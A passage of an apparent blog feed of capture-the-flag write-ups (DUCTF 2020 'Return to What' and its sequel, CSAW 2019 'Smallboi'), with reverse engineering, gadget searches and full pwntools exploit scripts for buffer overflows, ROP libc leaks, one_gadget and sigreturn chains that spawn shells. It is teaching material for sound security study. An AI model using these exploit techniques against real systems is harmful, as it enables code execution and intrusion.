rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>])
rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])


r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())

leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>readline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
leak <span style="color:#f92672">=</span> unpack(leak, len(leak) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
libc <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x765f0</span>


rop <span style="color:#f92672">=</span> flat(
    <span style="color:#75715e"># read(.data, stdin, 9)</span>
    pop_rdi, <span style="color:#ae81ff">0</span>, pop_rsi, <span style="color:#ae81ff">0x404000</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">9</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>syscall,
    
    <span style="color:#75715e"># open(&#34;flag.txt&#34;, 0, 0)</span>
    pop_rdi, <span style="color:#ae81ff">0x404000</span>, pop_rsi, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">2</span>, libc<span style="color:#f92672">+</span>syscall,
    
    <span style="color:#75715e"># read(3, .data+0x10, 35)</span>
    pop_rdi, <span style="color:#ae81ff">3</span>, pop_rsi, <span style="color:#ae81ff">0x404010</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">35</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>syscall,

    <span style="color:#75715e"># write(stdout, .data+0x10, 35)</span>
    pop_rdi, <span style="color:#ae81ff">1</span>, pop_rsi, <span style="color:#ae81ff">0x404010</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">35</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">1</span>, libc<span style="color:#f92672">+</span>syscall,

    <span style="color:#75715e"># exit(0)</span>
    pop_rdi, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">60</span>, libc<span style="color:#f92672">+</span>syscall
)

r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop)
r<span style="color:#f92672">.</span>writeline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag.txt</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)

r<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">&#39;Where would you like to return to?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)

print(r<span style="color:#f92672">.</span>readall())
r<span style="color:#f92672">.</span>close()
</code></pre></div><p>And finally, here&rsquo;s our exploit in action. It spawns an interactive shell that we can use to retrieve the flag.</p>
<pre><code>$ ./exploit.py 
[+] Starting local process './return-to-whats-revenge': pid 2683
[*] './return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-whats-revenge'
Today, we'll have a lesson in returns.
Where would you like to return to?
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
[*] Stopped process './return-to-whats-revenge' (pid 2683)
</code></pre>]]></content></item><item><title>DUCTF 2020 :: Return to What</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-what/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-what/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
$ file return-to-what return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped Running pwntools' checksec tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>We&rsquo;ll start by running <code>file</code> to get an idea of the executable&rsquo;s architecture and platform. Note that it is a 64-bit linux executable.</p>
<pre><code>$ file return-to-what 
return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped
</code></pre><p>Running pwntools' <code>checksec</code> tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&rsquo;t execute shellcode on the stack, we&rsquo;ll at least be able to access any part of the executable.</p>
<pre><code>$ checksec return-to-what                                                                                  130 ⨯
[*] './return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Running the executable reveals that it&rsquo;s only functionality is to accept user input, prior to exiting. It&rsquo;s likely that we&rsquo;ll find a vulnerability of some sort here.</p>
<pre><code>$ ./return-to-what 
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
</code></pre><p>Disassembly the executable shows us that it contains two important functions. The <code>main</code> function, which calls a function called <code>vuln</code>. The <code>vuln</code> function makes a <code>gets</code> call, we&rsquo;ve found a buffer overflow.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">void</span>)
{
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s;
    
    puts(<span style="color:#e6db74">&#34;Where would you like to return to?&#34;</span>);
    gets(<span style="color:#f92672">&amp;</span>s);
    <span style="color:#66d9ef">return</span>;
}

undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{
    puts(<span style="color:#e6db74">&#34;Today, we</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">ll have a lesson in returns.&#34;</span>);
    vuln();
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Since the executable doesn&rsquo;t leak any import information to us (such as a <code>libc</code> address), we&rsquo;ll have to find a way to leak something ourselves.</p>
<p>Looking at the imported functions, we can see an entry for <code>puts</code>. With this we should be able to do a classic <code>libc</code> leak with <code>puts(puts)</code>, more on that later.</p>
<pre><code>pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  gets@plt
0x0000000000401050  setvbuf@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401142  setup
0x0000000000401185  vuln
0x00000000004011ad  main
0x00000000004011d0  __libc_csu_init
0x0000000000401230  __libc_csu_fini
0x0000000000401234  _fini
</code></pre><p>Before going any further, let&rsquo;s find the offset of the <code>puts</code> function within <code>libc</code>. Below is a few GDB commands that achieves this goal.</p>
<p>Here&rsquo;s what we&rsquo;re doing:</p>
<ul>
<li>Printing the process map to get the start address of <code>libc</code>.</li>
<li>Getting the address of <code>puts</code>.</li>
<li>Subtracting the start address of <code>libc</code> from <code>puts</code> to get the offset.</li>
</ul>
<pre><code>pwndbg&gt; info proc map
process 1968
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
...
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&gt; p puts
$4 = {int (const char *)} 0x7ffff7e655f0 &lt;__GI__IO_puts&gt;
pwndbg&gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$5 = 0x765f0
</code></pre><p>There are a few more things we need to find before we can write our shellcode, mainly:</p>
<ul>
<li>A <code>pop rdi</code> instruction, so we can leak <code>libc</code>.</li>
<li>The &lsquo;magic&rsquo; gadget, so we can get a shell.</li>
</ul>
<p>We can use the <code>ropper</code> tool to find a <code>pop rdi</code> instruction, easily found within the executable.</p>
<pre><code>$ ropper --file ./return-to-what --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./return-to-what
0x000000000040122b: pop rdi; ret;
</code></pre><p>Using the <code>one_gadget</code> tool, we can find a &lsquo;magic&rsquo; gadget that&rsquo;ll immediately give us a shell, provided we meet the conditions. We just need a rop gadget that will help us set this up.</p>
<pre><code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbd1d execve(&quot;/bin/sh&quot;, r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbd20 execve(&quot;/bin/sh&quot;, rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
</code></pre><p>The &lsquo;magic&rsquo; gadget I like the most is the first one, so let&rsquo;s find a gadget that&rsquo;ll set this up. We&rsquo;ll use <code>ropper</code> again.</p>
<pre><code>$ ropper --file ./return-to-what --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12

[INFO] File: ./return-to-what
0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
</code></pre><h2 id="information-gathering">Information Gathering</h2>
<p>Now that we&rsquo;ve found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset of the return address from our input buffer.</p>
<p>Here&rsquo;s a quick script that&rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-what&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">100</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.</p>
<pre><code> ► 0x4011ac &lt;vuln+39&gt;    ret    &lt;0x6161616161616168&gt;
</code></pre><p>Using pwntools' <code>cyclic_find</code> function, we can use the value we found above to calculate the offset of the return address from our input buffer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616168</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">56</span>
</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we have everything we need, we can begin to write our exploit. There&rsquo;s quite a few things that we need to achieve, here&rsquo;s a list:</p>
<ul>
<li>Overwrite the return address to get control of process execution.</li>
<li>Use <code>puts</code> to print the value of <code>puts</code> stored in the global offset table (a <code>libc</code> address).</li>
<li>Capture the leaked <code>libc</code> address, and subtract the offset of the <code>puts</code> address to get the start address of <code>libc</code>.</li>
<li>Use the leaked <code>libc</code> address to redirect process execution to our &lsquo;magic&rsquo; gadget to get a shell.</li>
</ul>
<p>Keep in mind that we need to setup carefully for the &lsquo;magic&rsquo; gadget, as it&rsquo;ll only execute under specific circumstances.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)


pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>


<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0x000000000040122b: pop rdi; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x040122b</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
setup <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0401224</span>


r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-what&#39;</span>)


elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./return-to-what&#39;</span>)
rop <span style="color:#f92672">=</span> ROP(elf)

<span style="color:#75715e"># pop rdi; ret</span>
rop<span style="color:#f92672">.</span>raw(pop_rdi)
rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#75715e"># pop rdi</span>

<span style="color:#75715e"># puts</span>
rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#75715e"># puts(puts)</span>

<span style="color:#75715e"># main</span>
rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())

leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>readline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
leak <span style="color:#f92672">=</span> unpack(leak, len(leak) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
libc <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x765f0</span>

magic <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xcbd1a</span>


rop <span style="color:#f92672">=</span> ROP(elf)

<span style="color:#75715e"># setup </span>
rop<span style="color:#f92672">.</span>raw(setup)
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r12</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r13</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r14</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r15</span>

<span style="color:#75715e"># magic gadget</span>
rop<span style="color:#f92672">.</span>raw(magic)

r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())


r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s our exploit in action. It gives us an interactive shell that we can use to read the flag.</p>
<pre><code>$ ./exploit.py
[+] Starting local process './return-to-what': pid 2145
[*] './return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-what'
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
$ 
[*] Stopped process './return-to-what' (pid 2145)
</code></pre>]]></content></item><item><title>CSAW 2019 :: Smallboi</title><link>https://anvbis.github.io/posts/csaw-2019-smallboi/</link><pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-smallboi/</guid><description>Reverse Engineering Like usual, we&amp;rsquo;ll start by running file to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.
$ ./small_boi ./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped Running checksec reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Like usual, we&rsquo;ll start by running <code>file</code> to get a brief overflow of the executable&rsquo;s architecture. Note that it is a 64-bit linux executable.</p>
<pre><code>$ ./small_boi
./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
</code></pre><p>Running <code>checksec</code> reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&rsquo;t be able to execute any shellcode on the stack.</p>
<pre><code>$ checksec ./small_boi
[*] './small_boi'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Running the executable reveals that it, at some point, takes user input. We&rsquo;ll need to investigate this further to determine whether there is a vulnerability present.</p>
<pre><code>$ ./small_boi
asdfsadf
</code></pre><p>Viewing the disassembly of the entrypoint reveals that it calls some unknown function before it makes an <code>exit</code> syscall.</p>
<pre><code>entry0 ();
0x004001ad      push rbp
0x004001ae      mov rbp, rsp
0x004001b1      mov eax, 0
0x004001b6      call fcn.0040018c
0x004001bb      xor rax, rdi
0x004001be      mov rax, 0x3c      ; '&lt;' ; 60
0x004001c5      syscall            ; exit(...)
0x004001c7      nop
0x004001c8      pop rbp
0x004001c9      ret
</code></pre><p>Disassembling the function called within the entrypoint reveals a likely buffer overflow vulnerability.</p>
<p>We can see that the function reads 512 bytes of data in from <code>stdin</code> and stores it at a location only 32 bytes below the base of the function&rsquo;s stack frame.</p>
<pre><code>fcn.0040018c ();
; var int64_t var_20h @ rbp-0x20
0x0040018c      push rbp
0x0040018d      mov rbp, rsp
0x00400190      lea rax, [var_20h] ; rax = *var_20h
0x00400194      mov rsi, rax       ; rsi = rax = *var_20h
0x00400197      xor rax, rax       ; rax = 0
0x0040019a      xor rdi, rdi       ; rdi = 0
0x0040019d      mov rdx, 0x200     ; rdx = 512
0x004001a4      syscall            ; read(stdin, *var_20h, 512)
0x004001a6      mov eax, 0
0x004001ab      pop rbp
0x004001ac      ret
</code></pre><p>Looking at the disassembly for the <code>.text</code> section, we can see a sigreturn syscall. We can use this to execute any arbitrary syscall with a forged sigreturn frame.</p>
<pre><code>;-- section..text:
0x0040017c      push rbp           ; [02] -r-x section size 78 named .text
0x0040017d      mov rbp, rsp
0x00400180      mov eax, 0xf       ; 15
0x00400185      syscall            ; rt_sigreturn(...)
0x00400187      nop
0x00400188      pop rbp
0x00400189      ret
</code></pre><p>We also discover a <code>&quot;/bin/sh&quot;</code> string stored in the <code>.rodata</code> section. This could be very useful - however, I&rsquo;m going to avoid using it.</p>
<p>I believe there should be another solution (albeit a more complex solution) that allows us to avoid using this string. I&rsquo;ve arbitrarily decided that it feels a little like cheating.</p>
<pre><code>;-- str.bin_sh:
;-- section..rodata:
0x004001ca          .string &quot;/bin/sh&quot; ; len=8 ; [03] -r-- section size 8 named .rodata
</code></pre><p>For our alternative solution, we need to find a section within the binary that we have write permissions for.</p>
<p>Using <code>readelf</code>, we can see that we have write permissions for the <code>.data</code> section, stored at <code>0x601000</code>. We&rsquo;ll use this location to write a <code>&quot;/bin/sh&quot;</code> string, and pivot our stack.</p>
<pre><code>$ readelf --sections ./small_boi 
There are 9 section headers, starting at offset 0x1090:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.gnu.bu[...] NOTE             0000000000400158  00000158
       0000000000000024  0000000000000000   A       0     0     4
  [ 2] .text             PROGBITS         000000000040017c  0000017c
       000000000000004e  0000000000000000  AX       0     0     1
  [ 3] .rodata           PROGBITS         00000000004001ca  000001ca
       0000000000000008  0000000000000000   A       0     0     1
  [ 4] .eh_frame_hdr     PROGBITS         00000000004001d4  000001d4
       0000000000000024  0000000000000000   A       0     0     4
  [ 5] .eh_frame         PROGBITS         00000000004001f8  000001f8
       0000000000000078  0000000000000000   A       0     0     8
  [ 6] .data             PROGBITS         0000000000601000  00001000
       0000000000000010  0000000000000000  WA       0     0     8
  [ 7] .comment          PROGBITS         0000000000000000  00001010
       000000000000002a  0000000000000001  MS       0     0     1
  [ 8] .shstrtab         STRTAB           0000000000000000  0000103a
       0000000000000053  0000000000000000           0     0     1
</code></pre><h2 id="information-gathering">Information Gathering</h2>
<p>Let&rsquo;s do a little more information gathering before we write our exploit. We just need to find the offset of the return address from the start of the input buffer.</p>
<p>Here&rsquo;s a quick script that&rsquo;ll send a cyclic pattern of bytes to the input that we can use to find the offset of the return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./small_boi&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">512</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>Continuing in GDB, and letting the executable crash, reveals the data that overwrote the value of the return address.</p>
<pre><code> ► 0x4001ac    ret    &lt;0x6161616161616166&gt;
</code></pre><p>Using pwntools' <code>cyclic_find</code> function, and using the value above, we can find the offset of the return address from the start of our input buffer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616166</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">40</span>
</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
<p>We can chain sigreturn instructions to perform a <code>read</code> syscall and store <code>&quot;/bin/sh&quot;</code> in memory, before making another sigreturn call to execute <code>execve</code> with our <code>&quot;/bin/sh&quot;</code> string.</p>
<p>We just need to make sure that our first forged sigreturn frame maintains <code>$rip</code> and pivots the stack to <code>.data</code>, where we can continue execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)


pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>


<span style="color:#75715e"># address of sigreturn syscall</span>
sigret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400180</span>)

<span style="color:#75715e"># address of &#34;/bin/sh&#34; string </span>
bin_sh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004001ca</span>

<span style="color:#75715e"># address of syscall instruction</span>
<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">syscall; nop; pop rbp; ret
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0400185</span>

<span style="color:#75715e"># address of data section</span>
data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00601000</span> 


read_frame <span style="color:#f92672">=</span> SigreturnFrame()

read_frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_read
read_frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
read_frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> data
read_frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>
read_frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
read_frame<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> data <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>

read_frame <span style="color:#f92672">=</span> bytes(read_frame) 


execve_frame <span style="color:#f92672">=</span> SigreturnFrame()

execve_frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve
execve_frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> data
execve_frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
execve_frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
execve_frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall

execve_frame <span style="color:#f92672">=</span> bytes(execve_frame)


r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./small_boi&#39;</span>)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> sigret <span style="color:#f92672">+</span> read_frame)

r<span style="color:#f92672">.</span>clean(<span style="color:#ae81ff">1</span>)
r<span style="color:#f92672">.</span>writeline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> sigret <span style="color:#f92672">+</span> execve_frame)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>$ ./exploit.py
[+] Starting local process './small_boi': pid 2731
[*] Switching to interactive mode
$ cat flag.txt
csaw19{smallboi}
$ 
[*] Stopped process './small_boi' (pid 2731)
</code></pre>]]></content></item><item><title>CSAW 2019 :: Babyboi</title><link>https://anvbis.github.io/posts/csaw-2019-babyboi/</link><pubDate>Sat, 14 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-babyboi/</guid><description>Reverse Engineering Let&amp;rsquo;s use the file command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.
$ file ./baby_boi baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped We can also use pwntools' checksec tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Let&rsquo;s use the <code>file</code> command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.</p>
<pre><code>$ file ./baby_boi
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
</code></pre><p>We can also use pwntools' <code>checksec</code> tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.</p>
<p>This means a couple things for us:</p>
<ul>
<li>We can&rsquo;t execute shellcode on the stack.</li>
<li>Probably vulnerable to a BOF as there is no stack canary.</li>
<li>We might be able to build a ROP chain somewhere.</li>
</ul>
<pre><code>checksec ./baby_boi 
[*] './baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Let&rsquo;s run the executable and see what happens. The binary appears to leak some address (kinda looks like an address in <code>libc</code>, we&rsquo;ll definitely be able to use this).</p>
